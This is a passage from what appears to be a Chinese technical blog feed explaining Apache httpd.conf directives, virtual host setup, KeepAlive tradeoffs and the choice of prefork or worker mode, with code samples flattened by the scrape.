httpd.conf（或access.conf）中针对每个目录进行设置，另一个方法是在每个目录下设置访问控制文件，通常访问控制文件名字为.htaccess。虽然使用这两个方式都能用于控制浏览器的访问，然而使用配置文件的方法要求每次改动后重新启动httpd守护进程，比较不灵活，因此主要用于配置服务器系统的整体安全控制策略，而使用每个目录下的.htaccess文件设置具体目录的访问控制更为灵活方便。 1&lt;Directory “H:/web001“&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Directory语句就是用来定义目录的访问限制的，这里可以看出它的标准语法，为一个目录定义访问限制。上例的这个设置是针对系统的根目录进行的，设置了允许符号连接的选项FollowSymLinks ，以及使用AllowOverride None表示不允许这个目录下的访问控制文件来改变这里进行的配置，这也意味着不用查看这个目录下的相应访问控制文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于Apache对一个目录的访问控制设置是能够被下一级目录继承的，因此对根目录的设置将影响到它的下级目录。注意由于AllowOverride None的设置，使得Apache服务器不需要查看根目录下的访问控制文件，也不需要查看以下各级目录下的访问控制文件，直至httpd.conf（或access.conf ）中为某个目录指定了允许Alloworride，即允许查看访问控制文件。由于Apache对目录访问控制是采用的继承方式，如果从根目录就允许查看访问控制文件，那么Apache就必须一级一级的查看访问控制文件，对系统性能会造成影响。而缺省关闭了根目录的这个特性，就使得Apache从httpd.conf中具体指定的目录向下搜寻，减少了搜寻的级数，增加了系统性能。因此对于系统根目录设置AllowOverride None不但对于系统安全有帮助，也有益于系统性能。 12345Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow from all&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里定义的是系统对外发布文档的目录的访问设置，设置不同的AllowOverride选项，以定义配置文件中的目录设置和用户目录下的安全控制文件的关系，而Options选项用于定义该目录的特性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件和每个目录下的访问控制文件都可以设置访问限制，设置文件是由管理员设置的，而每个目录下的访问控制文件是由目录的属主设置的，因此管理员可以规定目录的属主是否能覆盖系统在设置文件中的设置，这就需要使用 AllowOverride参数进行设置，通常可以设置的值为： AllowOverride的设置 对每个目录访问控制文件作用的影响 All 缺省值，使访问控制文件可以覆盖系统配置 None 服务器忽略访问控制文件的设置 Options 允许访问控制文件中可以使用Options参数定义目录的选项 FileInfo 允许访问控制文件中可以使用AddType等参数设置 AuthConfig 允许访问控制文件使用AuthName，AuthType等针对每个用户的认证机制，这使目录属主能用口令和用户名来保护目录 Limit 允许对访问目录的客户机的IP地址和名字进行限制 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个目录具备一定属性，可以使用Options来控制这个目录下的一些访问特性设置，以下为常用的特性选项： Options设置 服务器特性设置 All 所有的目录特性都有效，这是缺省状态 None 所有的目录特性都无效 FollowSymLinks 允许使用符号连接，这将使浏览器有可能访问文档根目录（DocumentRoot）之外的文档 SymLinksIfOwnerMatch 只有符号连接的目的与符号连接本身为同一用户所拥有时，才允许访问，这个设置将增加一些安全性 ExecCGI 允许这个目录下可以执行CGI程序 Indexes 允许浏览器可以生成这个目录下所有文件的索引，使得在这个目录下没有index.html（或其他索引文件）时，能向浏览器发送这个目录下的文件列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外，上例中还使用了Order、Allow、Deny等参数，这是Limit语句中用来根据浏览器的域名和 IP地址来控制访问的一种方式。其中Order定义处理Allow和Deny的顺序，而Allow、Deny则针对名字或IP进行访问控制设置，上例使用allow from all，表示允许所有的客户机访问这个目录，而不进行任何限制。 1UserDir public_html (Win32=“My Documents/My Website“) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在一台FreeBSD上运行Apache服务器时，这台计算机上的所有用户都可以有自己的网页路径，形如 http://freebsd.example.org.cn/~user，使用波浪符号加上用户名就可以映射到用户自己的网页目录上。映射目录为用户个人主目录下的一个子目录，其名字就用UseDir这个参数进行定义，缺省为public_html。如果不想为正式的用户提供网页服务，使用DISABLED作UserDir的参数即可。 123456789101112## AllowOverride FileInfo AuthConfig Limit# Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec# # Order allow,deny# Allow from all# # # Order deny,allow# Deny from all# # &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里可以看到Directory的另一个用法，即可以通过简单的模式匹配方法，针对分布在不同目录下的子目录定义访问控制权限。这样设置就需要Apache服务器对每个路径进行额外的处理，因此就会降低服务器的性能，所以缺省情况并没有打开这种访问限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里可以看到另外一个语句Limit，Limit语句就是用来针对具体的请求方法来设定访问控制的，其中可以使用GET、POST等各种服务器支持的请求方法做Limit的参数，来设定对不同请求方法的访问限制。一般可以打开对GET、POST、HEAD三种请求方法，而屏蔽其他的请求方法，以增加安全性。Limit语句中，可以使用Order 、Allow、Deny，Allow和Deny中可以使用匹配的方法针对域名和IP进行限制，只是对于域名是从后向前匹配，对于IP地址则从前向后匹配。 1DirectoryIndex index.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;很多情况下，URL中并没有指定文档的名字，而只是给出了一个目录名。那么Apache服务器就自动返回这个目录下由DirectoryIndex定义的文件，当然可以指定多个文件名字，系统会这个目录下顺序搜索。当所有由DirectoryIndex指定的文件都不存在时，Apache服务器可以根据系统设置，生成这个目录下的所有文件列表，提供用户选择。此时该目录的访问控制选项中的Indexes选项（Options Indexes ）必须打开，以使得服务器能够生成目录列表，否则Apache将拒绝访问。 1AccessFileName .htaccess &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AccessFileName定义每个目录下的访问控制文件的文件名，缺省为.htaccess ，可以通过更改这个文件，来改变不同目录的访问控制限制。 12Order allow,denyDeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了可以针对目录进行访问控制之外，还可以根据文件来设置访问控制，这就是File语句的任务。使用File 语句，不管文件处于哪个目录，只要名字匹配，就必须接受相应的访问控制。这个语句对于系统安全比较重要，例如上例将屏蔽所有的使用者不能访问.htaccess文件，这样就避免.htaccess中的关键安全信息不至于被客户获取。 1TypesConfig /usr/local/etc/apache/mime.types &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TypeConfig用于设置保存有不同的MIME类型数据的文件名，在FreeBSD下缺省设置为/usr/local/etc/apache/mime.types。 1DefaultType text/plain &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果Web服务器不能决定一个文档的缺省类型，这通常表示文档使用了非标准的后缀，那么服务器就使用 DefaultType定义的MIME类型将文档发送给客户浏览器。这里的设置为text/plain，这样设置的问题是，如果服务器不能判断出文档的MIME，那么大部分情况下这个文档为一个二进制文档，但使用 text/plain格式发送回去，浏览器将在内部打开它而不会提示保存。因此建议将这个设置更改为 application/octet-stream，这样浏览器将提示用户进行保存。 1MIMEMagicFile /usr/local/etc/apache/magic &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了从文件的后缀出发来判断文件的MIME类型之外，Apache还可以进一步分析文件的一些特征，来判断文件的真实MIME类型。这个功能是由mod_mime_magic模块实现的，它需要一个记录各种MIME类型特征的文件，以进行分析判断。上面的设置是一个条件语句，如果载入了这个模块，就必须指定相应的标志文件magic的位置。 1HostnameLookups Off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常连接时，服务器仅仅可以得到客户机的IP地址，如果要想获得客户机的主机名，以进行日志记录和提供给 CGI程序使用，就需要使用这个HostnameLookups选项，将其设置为On打开DNS反查功能。但是这将使服务器对每次客户请求都进行DNS查询，增加了系统开销，使得反应变慢，因此缺省设置为使用Off关闭此选项。关闭选项之后，服务器就不会获得客户机的主机名，而只能使用IP地址来记录客户。 12345678910ErrorLog /var/log/httpd-error.logLogLevel warnLogFormat “%h %l %u %t \“%r\“ %&gt;s %b \“%&#123;Referer&#125;i\“ \“%&#123;User-Agent&#125;i\““ combinedLogFormat “%h %l %u %t \“%r\“ %&gt;s %b“ commonLogFormat “%&#123;Referer&#125;i -&gt; %U“ refererLogFormat “%&#123;User-agent&#125;i“ agent#CustomLog /var/log/httpd-access.log common#CustomLog /var/log/httpd-referer.log referer#CustomLog /var/log/httpd-agent.log agentCustomLog /var/log/httpd-access.log combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里定义了系统日志的形式，对于服务器错误记录， 由ErrorLog、LogLevel 来定义不同的错误日志文件及其记录内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于系统的访问日志，缺省使用CustomLog参数定义日志的位置，缺省使用combined 参数指定将所有的访问日志放在一个文件中，然而也可以将不同种类的访问日志放在不同的日志记录文件中，这是通过在 CustomLog中指定不同的记录类型来完成的。common表示普通的对单页面请求访问记录，referer表示每个页面的引用记录，可以看出一个页面中包含的请求数，agent表示对客户机的类型记录，显然可以将现有的combined 定义的设置行注释掉，并使用common、referer和agent作为CustomLog的参数，来为不同种类的日志分别指定日志记录文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显然，LogFormat是用于定义不同类型的日志进行记录时使用的格式， 这里使用了以%开头的宏定义，以记录不同的内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果这些参数指定的文件使用的是相对路径，那么就是相对于ServerRoot的路径。 1ServerSignature On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一些情况下，例如当客户请求的网页并不存在时，服务器将产生错误文档，缺省情况下由于打开了 ServerSignature选项，错误文档的最后一行将包含服务器的名字、Apache的版本等信息。有的管理员更倾向于不对外显示这些信息，就可以将这个参数设置为Off，或者设置为Email，最后一行将替换为对ServerAdmin 的Email提示。 123456Alias /icons/ “/usr/local/www/icons/“ Options Indexes MultiViews AllowOverride None Order allow,deny Allow from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Alias参数用于将URL与服务器文件系统中的真实位置进行直接映射，一般的文档将在DocumentRoot 中进行查询，然而使用Alias定义的路径将直接映射到相应目录下，而不再到DocumentRoot 下面进行查询。因此Alias可以用来映射一些公用文件的路径，例如保存了各种常用图标的icons路径。这样使得除了使用符号连接之外，文档根目录（DocumentRoot）外的目录也可以通过使用了Alias映射，提供给浏览器访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定义好映射的路径之后，应该需要使用Directory语句设置访问限制。 123456ScriptAlias /cgi-bin/ “/usr/local/www/cgi-bin/“ AllowOverride None Options None Order allow,deny Allow from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ScriptAlias也是用于URL路径的映射，但与Alias的不同在于，ScriptAlias是用于映射CGI程序的路径，这个路径下的文件都被定义为CGI程序，通过执行它们来获得结果，而非由服务器直接返回其内容。缺省情况下CGI程序使用cgi-bin目录作为虚拟路径。 1# Redirect old-URI new-URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Redirect参数是用来重写URL的，当浏览器访问服务器上的一个已经不存在的资源的时候，服务器返回给浏览器新的URL，告诉浏览器从该URL中获取资源。这主要用于原来存在于服务器上的文档，改变了位置之后，而又希望能使用老URL能访问到，以保持与以前的URL兼容。 123456789101112131415161718192021222324252627282930313233IndexOptions FancyIndexingAddIconByEncoding (CMP,/icons/compressed.gif) x-compress x-gzipAddIconByType (TXT,/icons/text.gif) text/*AddIconByType (IMG,/icons/image2.gif) image/*AddIconByType (SND,/icons/sound2.gif) audio/*AddIconByType (VID,/icons/movie.gif) video/*AddIcon /icons/binary.gif .bin .exeAddIcon /icons/binhex.gif .hqxAddIcon /icons/tar.gif .tarAddIcon /icons/world2.gif .wrl .wrl.gz .vrml .vrm .ivAddIcon /icons/compressed.gif .Z .z .tgz .gz .zipAddIcon /icons/a.gif .ps .ai .epsAddIcon /icons/layout.gif .html .shtml .htm .pdfAddIcon /icons/text.gif .txtAddIcon /icons/c.gif .cAddIcon /icons/p.gif .pl .pyAddIcon /icons/f.gif .forAddIcon /icons/dvi.gif .dviAddIcon /icons/uuencoded.gif .uuAddIcon /icons/script.gif .conf .sh .shar .csh .ksh .tclAddIcon /icons/tex.gif .texAddIcon /icons/bomb.gif coreAddIcon /icons/back.gif ..AddIcon /icons/hand.right.gif READMEAddIcon /icons/folder.gif ^^DIRECTORY^^AddIcon /icons/blank.gif ^^BLANKICON^^DefaultIcon /icons/unknown.gif#AddDescription “GZIP compressed document“ .gz#AddDescription “tar archive“ .tar#AddDescription “GZIP compressed tar archive“ .tgzReadmeName READMEHeaderName HEADERIndexIgnore .??* *~ *# HEADER* README* RCS CVS *,v *,t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当一个HTTP请求的URL为一个目录的时候，服务器返回这个目录中的索引文件。但如果一个目录中不存在缺省的索引文件，并且该服务器又许可显示目录文件列表的时候，就会显示出这个目录中的文件列表，为了使得这个文件列表能具有可理解性，而不仅仅是一个简单的列表，就需要前面的这些设置参数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用了IndexOptions FancyIndexing选项，可以让服务器产生的目录列表中针对各种不同类型的文档引用各种图标。而哪种文件使用哪种图标，则使用下面的 AddIconByEncoding、AddIconByType以及AddIcon来定义，分别依据MIME的编码、类型以及文件的后缀来判断使用何种图标。如果不能确定文档使用的图标，就使用 DefaultIcon定义的缺省图标。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样，使用AddDescription可以为不同类型的文档加入不同的描述。并且，服务器还在目录下，查询使用ReadmeName和HeaderName定义的文件（自动加上. html后缀，如果没有发现，再使用.txt后缀进行搜索），如果发现了这些文件，就在文件列表之前首先显示这些文件的内容，以使得普通目录列表具备更大的可理解性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IndexIgnore让服务器在列出文件列表时忽略相应的文件， 这里使用模式配置的方式定义文件名。 12AddEncoding x-compress ZAddEncoding x-gzip gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AddEncoding用于告诉一些使用压缩的MIME类型，这样可以让浏览器进行解压缩操作。 1234567AddLanguage en .enAddLanguage fr .frAddLanguage de .deAddLanguage da .daAddLanguage el .elAddLanguage it .itLanguagePriority en fr de &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个HTML文档可以同时具备多个语言的版本，如对于file1.html文档可以具备file1.html.en、file1.html.fr 等不同的版本，每个语言后缀必须使用AddLanguage进行定义。这样服务器可以针对不同国家的客户，通过与浏览器进行协商，发送不同的语言版本。而LanguagePriority 定义不同语言的优先级，以便在浏览器没有特殊要求时，按照顺序使用不同的语言版本回应对file1.html 的请求。这个国际化的能力实际的应用并不多。 1AddDefaultCharset ISO-8859-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器选择的标准编码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简体中文网站改为：GB2312 12#AddType application/x-httpd-php3 .phtml#AddType application/x-httpd-php3-source .phps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AddType参数可以为特定后缀的文件指定MIME类型，这里的设置将覆盖mime.types中的设置。 1#AddHandler cgi-script .cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AddHandler是用于指定非静态的处理类型，用于定义文档为一个非静态的文档类型，需要进行处理，再向浏览器返回处理结果。例如上面注释中的设置是将以.cgi结尾的文件设置为cgi-script类型，那么服务器将启动这个CGI程序以进行处理。如果需要在前面AliasScript定义的路径之外执行CGI程序，就需要使用这个参数进行设置，此后以.cgi结尾的文件将被当作CGI程序执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在配置文件、这个目录中的.htaccess以及其上级目录的.htaccess中必须允许执行CGI程序，这需要通过Options ExecCGI参数设定。 12#AddType text/html .shtml#AddHandler server-parsed .shtml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一种动态进行处理的类型为server-parsed，由服务器自身预先分析网页内的标记，将标记更改为正确的HTML标识。由于server-parsed需要对text/html类型的文档进行处理，因此首先定义了对应的.shtml为text/html类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而要支持SSI，还要首先要在配置文件（或.htaccess）中使用Options Includes允许该目录下的文档可以为SSI类型，或使用Options IncludesNOExec让执行普通的SSI标志，但不执行其中引用的外部程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另一种指定server-parsed类型的方式为使用XBitBack设置选项，如果将XBitHack设置为On，服务器将检查所有text/html类型的文档（包括.html后缀的文档），如果发现文件属性具备执行位 “x“，则服务器就认为它是服务器分析文档，需要服务器进行处理。推荐使用AddHandler进行设置，而将XBitBack 设置为Off，因为使用XBitBack将对所有的HTML文档都执行额外的检查，降低了效率。 123#AddHandler send-as-is asis#AddHandler imap-file map#AddHandler type-map var &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面被注释的AddHandler用于支持Apache服务器的asis、map和var处理能力。 12# Action media/type /cgi-script/location# Action handler-name /cgi-script/location &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为Apache内部提供的处理功能有限，因此可以使用Action为服务器定义外部程序作为可处理的动态文档类型，这些外部程序与标准CGI程序相同，都是对输入的数据处理之后，再输出不同MIME类型的结果。例如要定义一个对特殊后缀wri都先执行wri2txt进行处理操作，再返回结果的操作，可以使用： 12Action windows-writer /bin/wri2txtAddHandler windows-writer wri &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更进一步，可以直接使用Action定义对某个MIME类型预先进行处理操作，这需要例子中第一种格式的Action 参数设置方式。这样设置方式就不再需要额外的AddHandler用来将处理操作与文件后缀联系起来，而是使用Action直接处理MIME类型的文件。但如果文档后缀没有正式的MIME类型，还需要先定义一个MIME类型。 1234#ErrorDocument 500 “The server made a boo boo.#ErrorDocument 404 /missing.html#ErrorDocument 404 /cgi-bin/missing_handler.pl#ErrorDocument 402 http://some.other_server.com/subscription_info.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果客户请求的网页不存在，或者没有访问权限等情况发生时，服务器将产生一个错误代码，同时也将回应客户浏览器一个标识错误的网页。ErrorDocument就用于设置当出现哪个错误时应该回应客户浏览器那些内容，ErrorDocument的第一个参数为错误的序号，第二个参数为回应的数据，可以为简单的文本，本地网页，本地CGI程序，以及远程主机上的网页。 12345BrowserMatch “Mozilla/2“ nokeepaliveBrowserMatch “MSIE 4\.0b2;“ nokeepalive downgrade-1.0 force-response-1.0BrowserMatch “RealPlayer 4\.0“ force-response-1.0BrowserMatch “Java/1\.0“ force-response-1.0BrowserMatch “JDK/1\.0“ force-response-1.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BrowserMatch命令为特定的客户程序，设置特殊的参数，以保证对老版本浏览器的兼容性，并支持新浏览器的新特性。 123456789101112131415161718##ProxyRequests On### Order deny,allow# Deny from all# Allow from .your_domain.com##ProxyVia On#CacheRoot “/usr/local/www/proxy“#CacheSize 5#CacheGcInterval 4#CacheMaxExpire 24#CacheLastModifiedFactor 0.1#CacheDefaultExpire 1#NoCache a_domain.com another_domain.edu joes.garage_sale.com# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache服务器本身就具备代理的功能，然而这要求加载入mod_proxy模块。这能使用IfModule语句进行判断，如果存在mod_proxy模块，就使用ProxyRequests打开代理支持。此后的Directory用于设置对Proxy功能的访问权限设置，以及用于设置缓冲的各个参数设置。 123456789101112#NameVirtualHost 12.34.56.78:80#NameVirtualHost 12.34.56.78## ServerAdmin webmaster@host.some_domain.com# DocumentRoot /www/docs/host.some_domain.com# ServerName host.some_domain.com# ErrorLog logs/host.some_domain.com-error_log# CustomLog logs/host.some_domain.com-access_log common### &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺省设置文件中的这些内容是用于设置命名基础的虚拟主机服务器时使用。其中NameVirtualHost 来指定虚拟主机使用的IP地址，这个IP地址将对应多个DNS名字，如果Apache使用了Listen 参数控制了多个端口，那么就可以在这里加上端口号以进一步进行区分对不同端口的不同连接请求。此后，使用 VirtualHost语句，使用NameVirtualHost指定的IP地址作参数，对每个名字都定义对应的虚拟主机设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟主机是在一台Web服务器上，可以为多个单独域名提供Web服务，并且每个域名都完全独立，包括具有完全独立的文档目录结构及设置，这样域名之间完全独立，不但使用每个域名访问到的内容完全独立，并且使用另一个域名无法访问其他域名提供的网页内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟主机的概念对于ISP来讲非常有用，因为虽然一个组织可以将自己的网页挂在具备其他域名的服务器上的下级往址上，但使用独立的域名和根网址更为正式，易为众人接受。传统上，必须自己设立一台服务器才能达到单独域名的目的，然而这需要维护一个单独的服务器，很多小单位缺乏足够的维护能力，更为合适的方式是租用别人维护的服务器。ISP也没有必要为一个机构提供一个单独的服务器，完全可以使用虚拟主机能力，使服务器为多个域名提供Web服务，而且不同的服务互不干扰，对外就表现为多个不同的服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有两种设定虚拟主机的方式，一种是基于HTTP 1.0标准，需要一个具备多IP地址的服务器，再配置DNS 服务器，给每个IP地址以不同的域名，最后才能配置Apache的配置文件，使服务器对不同域名返回不同的Web文档。由于这需要使用额外的IP地址，对每个要提供服务的域名都要使用单独的IP地址，因此这种方式实现起来问题较多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在一个网络界面上绑定多个IP地址，FreeBSD下需要使用ifconfig的alias参数来进行这个配置，但此时会影响网络性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HTTP 1.1标准在协议中规定了对浏览器和服务器通信时，服务器能够跟踪浏览器请求的是哪个主机名字。因此可以利用这个新特性，使用更轻松的方式设定虚拟主机。这种方式不需要额外的IP地址，但需要新版本的浏览器支持。这种方式已经成为建立虚拟主机的标准方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要建立非IP基础的虚拟主机，多个域名是不可少的配置，因为每个域名就对应一个要服务的虚拟主机。因此需要更改DNS服务器的配置，为服务器增加多个CNAME选项，如： 123freebsd IN A 192.168.1.64vhost1 IN CNAME freebsdvhost2 IN CNAME freebsd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本的设置选项都是为了freebsd主机设定的，如果要为vhost1和vhost2设定虚拟主机，就要使用VirtualHost语句定义不同的选项，在语句中可以使用配置文件前面中的大部分选项，而可以重新定义几乎所有的针对服务器的设置。 123456789101112NameVirtualHost 192.168.1.64DocumentRoot /usr/local/www/dataServerName freebsd.example.org.cnDocumentRoot /vhost1ServerName vhost1.example.org.cnDocumentRoot /vhost2ServerName vhost2.example.org.cn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里需要注意的是，VirtualHost的参数地址一定要和NameVirtualHost定义的地址相一致，必须保证所有的值严格一致，Apache服务器才承认这些定义是为这个IP地址定义的虚拟主机。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外，定义过NameVirtualHost之后，那么对这个IP地址的访问都被区分不同的虚拟主机进行处理，而对其他IP地址的访问，例如127.0.0.1，才应用前面定义的缺省选项。 1NameVirtualHost www.xxx.org &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;（对于动态IP的另类方法：指定虚拟主机的IP，由于要将域名映射为IP，不能使用localhost,127.0.0.1,计算机名，等这样的地址，所以，可以再一次通过域名转换，将域名转换为IP，这样就不必每次更改IP了。） 123456789101112131415161718192021## VirtualHost example:# Almost any Apache directive may go into a VirtualHost container.# The first VirtualHost section is used for requests without a known# server name.#&lt;VirtualHost 192.168.0.1&gt;（虚拟主机IP） ServerAdmin 111@xxx.com（第一个虚拟主机Email） DocumentRoot H:/web001（第一个虚拟主机目录） ServerName www.xxx.org（第一个虚拟主机域名） ErrorLog logs/www.xxx.org-error.log（第一个虚拟主机错误日志） CustomLog logs/www.xxx.org-access.log common（第一个虚拟主机数据）&lt;/VirtualHost&gt;&lt;VirtualHost 192.168.0.2&gt;（虚拟主机IP） ServerAdmin 111@xxx.com（第二个虚拟主机Email） DocumentRoot H:/web002（第二个虚拟主机目录） ServerName www.xxx2.org（第二个虚拟主机域名） ErrorLog logs/www.xxx2.org-error.log（第二个虚拟主机错误日志） CustomLog logs/www.xxx2.org-access.log common（第二个虚拟主机数据）&lt;/VirtualHost&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以此类推，可以增加更多虚拟主机。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[httpd.conf文件如何配置KeepAlive]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F23.%20httpd.conf%E6%96%87%E4%BB%B6%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEKeepAlive%2F</url>
    <content type="text"><![CDATA[httpd.conf文件如何配置KeepAlive&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;KeepAlive 意思为是否长连接。 后边可以设置 On 或者 Off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单理解就是这样： 如果设置成On，那么当apache完成用户的请求后，那么apache进程不会断开用户的请求连接，依然保持连接状态。设置成Off则当apache完成用户的请求后，那么apache进程会立即断开和用户的请求连接。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果，完成用户的连接依然连接，这样的好处是：当该用户的请求在过来时，apache会用这个已经建立的连接，不需要重新创建连接。这样会节省CPU的资源。但是却耗费了内存。为什么呢？可以假设这样的场景。假如keepalive 超时时间为10s，而每1s中有100个用户请求访问，每个用户3次连接，每个连接耗费2M内存，那么10s内建立的连接次数为1000次（跟用户每s请求次数无关），消耗内存为10002=2000M，相反，如果不保持长连接，同样的环境场景下，每1s内有1003个连接，下一秒还是1003个连接，也就是说永远都是1003个连接，那么1s内甚至10s内消耗的内存为10032=600M。 然而，在这10s内创建的连接次数为100310=3000次，这样肯定消耗了更多的cpu资源。毕竟每次tcp连接都是需要cpu去处理的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;问题来了，既然知道长连接与否的利与弊，那么如何判定什么时候On，什么时候Off？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面的举例中，涉及到了一个数，那就是每个用户在1s内请求的次数，你再回去好好看看，如果把3改为1，是不是10s内得到的连接次数总和是一样的。对！那么这样无论是On还是Off，消耗的CPU资源是一样的。所以，我们考虑3种情况： 用户浏览一个网页时，除了网页本身外，还引用了多个 javascript 文件，多个 css 文件，多个图片文件，并且这些文件都在同一个 HTTP 服务器上。 用户浏览一个网页时，除了网页本身外，还引用一个 javascript 文件，一个图片文件。 用户浏览的是一个动态网页，由程序即时生成内容，并且不引用其他内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于上面3中情况，我认为：1 最适合打开 KeepAlive ，2 随意，3 最适合关闭 KeepAlive（连接消耗的内存比较大） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结一下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在内存非常充足的服务器上，不管是否关闭 KeepAlive 功能，服务器性能不会有明显变化； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果服务器内存较少，或者服务器有非常大量的文件系统访问时，或者主要处理动态网页服务，关闭 KeepAlive 后可以节省很多内存，而节省出来的内存用于文件系统Cache，可以提高文件系统访问的性能，并且系统会更加稳定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前的服务器，CPU很强，所以不用考虑频繁的tcp连接对cpu造成的压力，那还让它长连接干什么，故，建议关闭你的长连接吧！！！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS： 如果，你的服务器上请求量很大，那你最好还是关闭这个参数吧。我试过一次，打开长连接，并且设置超时时间为30s，结果仅仅十几s就把所有的httpd进程跑满。这样很危险的，直接让用户等待，等30s，这不扯淡嘛？即使是你设置成3s，照样会让用户等待3s，这样很不合理的。所以，归根结蒂还是关闭长连接吧，这样效率会更高。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用apache的 work模式还是 prefork 模式]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F17.%20%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8apache%E7%9A%84%20work%E6%A8%A1%E5%BC%8F%E8%BF%98%E6%98%AF%20prefork%20%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[如何使用apache的 work模式还是 prefork 模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：2.4之前版本默认为prefork， 2.4已经变为event模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在编译apache的时候，有一个参数叫做 --with-mpm=... 等号后边用于指定那种模式，可选的有 beos|event|worker|prefork|mpmt_os2 其中，咱们都知道 prefork 以及 worker 其他模式就不晓得了，感兴趣不妨你去google一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你编译时，不指定哪种模式，就是说，不加该参数，那么默认apache会以prefork模式来为我们提供服务。 1/configure --prefix=/usr/local/apache2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;验证的话，就是用 apachectl -l 看看是否有 prefork.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想要worker模式，那么请指定 1./configure --prefix=/usr/local/apache2 --with-mpm=worker &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apachectl -l 查看，有worker.c 而没有 prefork.c]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP安装 Discuz！]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F18.%20LAMP%E5%AE%89%E8%A3%85%20Discuz%EF%BC%81%2F</url>
